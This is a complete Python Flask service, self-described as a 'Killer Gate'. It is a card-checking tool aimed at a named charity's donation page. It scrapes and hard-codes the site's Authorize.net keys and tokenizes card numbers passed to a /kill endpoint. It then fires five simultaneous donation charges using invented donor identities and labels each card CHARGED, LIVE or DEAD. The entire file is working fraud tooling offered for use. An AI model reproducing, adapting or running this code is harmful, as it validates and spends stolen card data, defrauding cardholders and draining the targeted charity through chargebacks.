#!/usr/bin/env python3
"""
Authorize.net Killer Gate — helpingisraelfund.com
Port: 8095
Endpoint: /kill?cc=CC|MM|YY|CVV&amount=10
DEV: chirgg_911
"""

from flask import Flask, request, jsonify
import requests
import json
import re
import time
import random
import string
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

DEV = "chirgg_911"

TARGET = "https://helpingisraelfund.com"
DONATE = f"{TARGET}/donate/"
FORM_ID = "306"
GATEWAY = "authorize"

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"

AUTH_URL = "https://api2.authorize.net/xml/v1/request.api"

DEFAULT_AUTH_LOGIN = "43D8rvpNZ"
DEFAULT_AUTH_CLIENT = "4yLL27sQ9HhzpHLr27sgfUY4kp894PydK6v24NadbnpX9L4m43Vm4UCX2dwn7D7U"
DEFAULT_AUTH_ID = "1dcaabea-fa2b-f4f8-631c-d335badfda3f"

ATTEMPTS = 5
TOKENIZE_RETRIES = 3
BANNED_BINS = {
    "535563", "543446", "532610", "485340",
    "531106", "494116", "516929", "435880",
    "517608", "416549",
}

BIN_CACHE = {}
BIN_LOCK = threading.Lock()


def _flag(code):
    if not code or len(code) != 2:
        return ""
    code = code.upper()
    return chr(127397 + ord(code[0])) + chr(127397 + ord(code[1]))


def get_bin_info(bin_num):
    bin_num = str(bin_num)[:6]
    with BIN_LOCK:
        if bin_num in BIN_CACHE:
            return BIN_CACHE[bin_num]

    info = {"brand": "UNKNOWN", "type": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": ""}
    for src, url in [
        ("juspay", f"https://api.juspay.in/cardbins/{bin_num}"),
        ("handy", f"https://data.handyapi.com/bin/{bin_num}"),
        ("binlist", f"https://lookup.binlist.net/{bin_num}"),
    ]:
        try:
            r = requests.get(url, timeout=5, verify=False)
            if r.status_code != 200:
                continue
            j = r.json()
            if src == "juspay":
                info = {
                    "brand": (j.get("brand") or "UNKNOWN").upper(),
                    "type": (j.get("type") or "UNKNOWN").upper(),
                    "bank": (j.get("bank") or "UNKNOWN").title(),
                    "country": (j.get("country") or "UNKNOWN").title(),
                    "flag": "",
                }
            elif src == "handy":
                if j.get("Status") != "SUCCESS":
                    continue
                iso2 = (j.get("Country", {}).get("A2") or "").upper()
                info = {
                    "brand": (j.get("Scheme") or "UNKNOWN").upper(),
                    "type": (j.get("Type") or "UNKNOWN").upper(),
                    "bank": (j.get("Issuer") or "UNKNOWN").title(),
                    "country": (j.get("Country", {}).get("Name") or "UNKNOWN").title(),
                    "flag": _flag(iso2),
                }
            elif src == "binlist":
                iso2 = (j.get("country", {}).get("alpha2") or "").upper()
                info = {
                    "brand": (j.get("brand") or "UNKNOWN").upper(),
                    "type": (j.get("type") or "UNKNOWN").upper(),
                    "bank": (j.get("bank", {}).get("name") or "UNKNOWN").title(),
                    "country": (j.get("country", {}).get("name") or "UNKNOWN").title(),
                    "flag": j.get("country", {}).get("emoji") or _flag(iso2),
                }
            if info["brand"] != "UNKNOWN":
                break
        except Exception:
            continue

    with BIN_LOCK:
        BIN_CACHE[bin_num] = info
    return info


FIRST_NAMES = ["John", "James", "Robert", "Michael", "William", "David", "Joseph", "Thomas", "Emma", "Olivia"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
CITIES = [("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), ("Chicago", "IL", "60601"),
          ("Houston", "TX", "77001"), ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101")]
STREETS = ["Main St", "Oak Ave", "Park Dr", "Elm St", "Maple Ln", "Cedar Rd"]


def rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def rand_email(first, last):
    return f"{first.lower()}{last.lower()}{rand_str(5)}@{random.choice(['gmail.com','yahoo.com','outlook.com','hotmail.com'])}"


def rand_phone():
    return f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"


def scrape_form(session):
    try:
        r = session.get(DONATE, headers={
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }, timeout=30, verify=False)

        html = r.text

        login_m = re.search(r'apiLoginID["\']?\s*[:=]\s*["\']([A-Za-z0-9]+)["\']', html)
        client_m = re.search(r'clientKey["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=]{20,})["\']', html)
        hash_m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
        min_m = re.search(r'name="give-form-minimum"\s+value="([^"]+)"', html)
        max_m = re.search(r'name="give-form-maximum"\s+value="([^"]+)"', html)

        # route signature from the givewpDonationFormExports blob
        donate_url_m = re.search(r'"donateUrl":"([^"]+)"', html)
        donate_url = donate_url_m.group(1).replace("\\/", "/") if donate_url_m else ""

        route_sig = ""
        route_sig_exp = ""
        if donate_url:
            m = re.search(r"givewp-route-signature=([a-f0-9]+)", donate_url)
            route_sig = m.group(1) if m else ""
            m2 = re.search(r"givewp-route-signature-expiration=(\d+)", donate_url)
            route_sig_exp = m2.group(1) if m2 else ""

        return {
            "login_id": login_m.group(1) if login_m else DEFAULT_AUTH_LOGIN,
            "client_key": client_m.group(1) if client_m else DEFAULT_AUTH_CLIENT,
            "form_hash": hash_m.group(1) if hash_m else "",
            "form_minimum": min_m.group(1) if min_m else "10.00",
            "form_maximum": max_m.group(1) if max_m else "999999.99",
            "donate_url": donate_url,
            "route_sig": route_sig,
            "route_sig_exp": route_sig_exp,
            "html_ok": r.status_code == 200,
            "status": r.status_code,
        }
    except Exception as e:
        return {"login_id": "", "client_key": "", "form_hash": "", "html_ok": False, "error": str(e)[:120]}


def tokenize(card_number, expiration, cvv, login_id, client_key, auth_id):
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {"name": login_id, "clientKey": client_key},
            "data": {
                "type": "TOKEN",
                "id": auth_id,
                "token": {
                    "cardNumber": card_number,
                    "expirationDate": expiration,
                    "cardCode": cvv,
                },
            },
        }
    }

    last_error = None
    for attempt in range(TOKENIZE_RETRIES):
        try:
            r = requests.post(AUTH_URL, data=json.dumps(payload), headers={
                "User-Agent": UA,
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": TARGET,
                "Referer": DONATE,
            }, timeout=30, verify=False)

            try:
                data = json.loads(r.text.lstrip("\ufeff"))
            except Exception:
                last_error = f"parse: {r.text[:120]}"
                continue

            if data.get("messages", {}).get("resultCode") == "Ok":
                opaque = data.get("opaqueData", {})
                return {
                    "ok": True,
                    "descriptor": opaque.get("dataDescriptor"),
                    "value": opaque.get("dataValue"),
                }

            errs = data.get("messages", {}).get("message", [])
            return {
                "ok": False,
                "error": "auth_failed",
                "text": errs[0].get("text") if errs else "unknown",
                "codes": [e.get("code") for e in errs],
            }
        except Exception as e:
            last_error = f"{type(e).__name__}: {str(e)[:100]}"
            time.sleep(0.5)

    return {"ok": False, "error": "tokenize_exhausted", "text": last_error or "unknown"}


def classify_givewp(body, http_status, final_url):
    body_lower = body.lower()

    clean = re.sub(r"<script.*?</script>", " ", body, flags=re.DOTALL | re.IGNORECASE)
    clean = re.sub(r"<style.*?</style>", " ", clean, flags=re.DOTALL | re.IGNORECASE)
    clean = re.sub(r"<!--.*?-->", " ", clean, flags=re.DOTALL)
    clean = re.sub(r"<[^>]+>", " ", clean)
    clean = re.sub(r"\s+", " ", clean).strip()
    clean_lower = clean.lower()

    url_lower = (final_url or "").lower()
    has_donation_id = "donation_id=" in url_lower or "donation-id=" in url_lower

    error_markers = {
        "insufficient": ["insufficient funds", "not enough balance", "balance is too low"],
        "cvc_fail": ["incorrect cvc", "security code is incorrect", "cvc mismatch", "invalid security code", "incorrect card security code"],
        "expired": ["credit card has expired", "card has expired", "expired card", "the card is expired", "expiration date is invalid"],
        "3ds": ["3d secure", "authentication required", "authenticate your card", "requires 3d", "3ds authentication"],
        "declined": [
            "card was declined", "card declined", "do not honor", "refused",
            "not authorized", "invalid card", "cannot be processed",
            "transaction declined", "declined",
        ],
        "amount_too_low": ["minimum donation amount", "minimum donation is"],
    }

    for kw in error_markers["amount_too_low"]:
        if kw in clean_lower or kw in body_lower:
            return "amount_too_low", "amount below minimum"

    for status, keywords in [
        ("insufficient", error_markers["insufficient"]),
        ("cvc_fail", error_markers["cvc_fail"]),
        ("expired", error_markers["expired"]),
        ("3ds", error_markers["3ds"]),
        ("declined", error_markers["declined"]),
    ]:
        for kw in keywords:
            if kw in clean_lower:
                snippet = clean_lower[max(0, clean_lower.find(kw) - 40):clean_lower.find(kw) + 80]
                return status, snippet.strip()

    success_markers = [
        "thank you for your donation",
        "thank you for your generosity",
        "your donation was successful",
        "receipt has been sent to your email",
        "your donation receipt",
        "we've sent your donation receipt",
    ]
    for kw in success_markers:
        if kw in clean_lower:
            return "approved", kw

    if "donation-confirmation" in url_lower and has_donation_id:
        return "approved", "redirect + donation_id"

    if "give_error" in body_lower:
        m = re.search(r'class="[^"]*give_error[^"]*"[^>]*>(.*?)</', body, re.DOTALL | re.IGNORECASE)
        if m:
            text = re.sub(r"<[^>]+>", "", m.group(1)).strip()
            return "declined", text[:200]
        return "declined", "give_error block"

    if "donation-confirmation" in url_lower:
        return "declined", "confirmation without donation_id"

    return "unknown", f"no marker; http={http_status}, url={url_lower[:60]}"


def donation_attempt(card_number, expiration, cvv, scraped, amount, attempt_num):
    req_id = f"req-{attempt_num}-{rand_str(4)}"
    started = time.time()
    result = {
        "req_id": req_id,
        "attempt": attempt_num,
        "status": "unknown",
        "response": "",
        "location": "",
        "http_status": 0,
        "duration": 0.0,
    }

    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    city, state, zipc = random.choice(CITIES)
    street = f"{random.randint(100,9999)} {random.choice(STREETS)}"
    email = rand_email(first, last)
    phone = rand_phone()

    tok = tokenize(card_number, expiration, cvv, scraped["login_id"], scraped["client_key"], DEFAULT_AUTH_ID)
    if not tok.get("ok"):
        result["status"] = "tokenize_fail"
        result["response"] = tok.get("text", tok.get("error", "tokenize failed"))
        result["duration"] = round(time.time() - started, 2)
        return result

    donation_payload = {
        "give-honeypot": "",
        "give-form-id-prefix": f"{FORM_ID}-1",
        "give-form-id": FORM_ID,
        "give-form-title": "Donate",
        "give-current-url": DONATE,
        "give-form-url": DONATE,
        "give-form-minimum": scraped.get("form_minimum", "10.00"),
        "give-form-maximum": scraped.get("form_maximum", "999999.99"),
        "give-form-hash": scraped.get("form_hash", ""),
        "give-price-id": "custom",
        "give-amount": str(amount),
        "give_stripe_payment_method": "",
        "payment-mode": GATEWAY,
        "give_first": first,
        "give_last": last,
        "give_company_option": "no",
        "give_company_name": "",
        "give_email": email,
        "give_comment": "",
        "card_name": f"{first} {last}",
        "billing_country": "US",
        "card_address": street,
        "card_address_2": "",
        "card_city": city,
        "card_state": state,
        "card_zip": zipc,
        "give_action": "purchase",
        "give-gateway": GATEWAY,
        "give_authorize_data_descriptor": tok.get("descriptor", ""),
        "give_authorize_data_value": tok.get("value", ""),
        # fee recovery fields
        "give-fee-mode-enable": "false",
        "give-fee-amount": "0.00",
        "give-fee-status": "disabled",
        "give-recurring-period": "",
        "_give_is_donation_recurring": "0",
        "give-radio-donation-level": "custom",
        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
    }

    # build the final POST URL — if we have a route signature, include it
    post_url = DONATE
    post_params = {"payment-mode": GATEWAY, "form-id": FORM_ID}
    if scraped.get("route_sig"):
        post_params = {
            "givewp-route": "donate",
            "givewp-route-signature": scraped["route_sig"],
            "givewp-route-signature-id": "givewp-donate",
            "givewp-route-signature-expiration": scraped.get("route_sig_exp", ""),
        }

    try:
        sess = requests.Session()
        r = sess.post(
            post_url,
            params=post_params,
            data=donation_payload,
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": TARGET,
                "Referer": f"{DONATE}?form-id={FORM_ID}&payment-mode={GATEWAY}&level-id=custom&custom-amount={amount}",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            },
            timeout=45,
            verify=False,
            allow_redirects=True,
        )

        body = r.text
        result["http_status"] = r.status_code
        result["location"] = r.url[:200] if r.url else ""

        try:
            with open(f"/tmp/at_body_{req_id}.html", "w") as f:
                f.write(body)
        except Exception:
            pass

        status, response_text = classify_givewp(body, r.status_code, r.url)
        result["status"] = status
        result["response"] = response_text[:200]

    except Exception as e:
        result["status"] = "error"
        result["response"] = f"{type(e).__name__}: {str(e)[:120]}"

    result["duration"] = round(time.time() - started, 2)
    return result


def killer(card_number, expiration, cvv, amount=10):
    start = time.time()

    # banned-bins check inside
    if card_number[:6] in BANNED_BINS:
        return {
            "card": f"{card_number}|{expiration[:2]}|20{expiration[-2:]}|{cvv}",
            "verdict": "ERROR",
            "reason": f"BIN {card_number[:6]} is banned",
            "attempts": [],
            "time": round(time.time() - start, 2),
            "dev": DEV,
        }

    bin_info = get_bin_info(card_number[:6])

    out = {
        "card": f"{card_number}|{expiration[:2]}|20{expiration[-2:]}|{cvv}",
        "bin": card_number[:6],
        "bin_info": bin_info,
        "attempts": [],
        "verdict": "UNKNOWN",
        "reason": "",
        "time": 0.0,
        "dev": DEV,
    }

    sess = requests.Session()
    sess.verify = False
    scraped = scrape_form(sess)

    if not scraped.get("html_ok"):
        out["verdict"] = "ERROR"
        out["reason"] = f"form fetch failed: HTTP {scraped.get('status')}"
        out["time"] = round(time.time() - start, 2)
        return out

    if not scraped.get("login_id") or not scraped.get("client_key"):
        out["verdict"] = "ERROR"
        out["reason"] = "authnet credentials missing"
        out["time"] = round(time.time() - start, 2)
        return out

    with ThreadPoolExecutor(max_workers=ATTEMPTS) as ex:
        futures = [
            ex.submit(donation_attempt,
                      card_number, expiration, cvv,
                      scraped, amount, i + 1)
            for i in range(ATTEMPTS)
        ]
        for f in futures:
            try:
                out["attempts"].append(f.result(timeout=60))
            except Exception as e:
                out["attempts"].append({"status": "error", "response": str(e)[:120]})

    statuses = [a["status"] for a in out["attempts"]]
    counts = {s: statuses.count(s) for s in set(statuses)}
    out["counts"] = counts

    if counts.get("approved", 0) > 0:
        out["verdict"] = "CHARGED"
        out["reason"] = "card approved / charged"
    elif counts.get("3ds", 0) > 0:
        out["verdict"] = "3DS"
        out["reason"] = "3DS challenge required"
    elif counts.get("insufficient", 0) > 0:
        out["verdict"] = "LIVE"
        out["reason"] = "insufficient funds"
    elif counts.get("cvc_fail", 0) > 0:
        out["verdict"] = "LIVE"
        out["reason"] = "cvc mismatch"
    elif counts.get("expired", 0) > 0:
        out["verdict"] = "DEAD"
        out["reason"] = "expired card"
    elif counts.get("declined", 0) > 0:
        out["verdict"] = "DEAD"
        out["reason"] = "card declined"
    elif counts.get("amount_too_low", 0) > 0:
        out["verdict"] = "ERROR"
        out["reason"] = "amount below minimum"
    elif counts.get("tokenize_fail", 0) == ATTEMPTS:
        out["verdict"] = "DEAD"
        out["reason"] = "tokenization failed on all attempts"
    elif counts.get("unknown", 0) == ATTEMPTS:
        out["verdict"] = "ERROR"
        out["reason"] = "all attempts unknown"
    else:
        out["verdict"] = "MIXED"
        out["reason"] = f"status distribution: {counts}"

    out["time"] = round(time.time() - start, 2)
    return out


@app.route("/kill")
def kill():
    cc_param = request.args.get("cc", "").strip()
    amount = request.args.get("amount", "10").strip()

    if not cc_param:
        return jsonify({"status": "error", "message": "missing cc param", "dev": DEV}), 400

    parts = cc_param.replace("/", "|").split("|")
    if len(parts) < 4:
        return jsonify({"status": "error", "message": "format CC|MM|YY|CVV", "dev": DEV}), 400

    card_number, mm, yy, cvv = [p.strip() for p in parts[:4]]

    if len(yy) == 4:
        yy = yy[-2:]
    if len(mm) == 1:
        mm = f"0{mm}"

    if len(card_number) < 13 or len(card_number) > 19:
        return jsonify({"status": "error", "message": "invalid card length", "dev": DEV}), 400

    expiration = f"{mm}{yy}"

    try:
        result = killer(card_number, expiration, cvv, amount)
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"{type(e).__name__}: {str(e)[:150]}",
            "dev": DEV,
        }), 500

    return jsonify(result)


@app.route("/health")
def health():
    return jsonify({"ok": True, "target": TARGET, "form_id": FORM_ID, "dev": DEV})


@app.route("/")
def index():
    return jsonify({
        "api": "Authorize.net Killer Gate",
        "target": TARGET,
        "endpoint": "/kill?cc=CC|MM|YY|CVV&amount=10",
        "port": 8095,
        "attempts": ATTEMPTS,
        "dev": DEV,
    })


if __name__ == "__main__":
    print(f"Authnet Killer Gate — {TARGET}")
    print(f"Port: 8095 | Attempts: {ATTEMPTS}")
    print("/kill?cc=4111111111111111|12|29|123&amount=10")
    print("Dev: @chirgg_911")
    app.run(host="0.0.0.0", port=8095, debug=False, threaded=True)
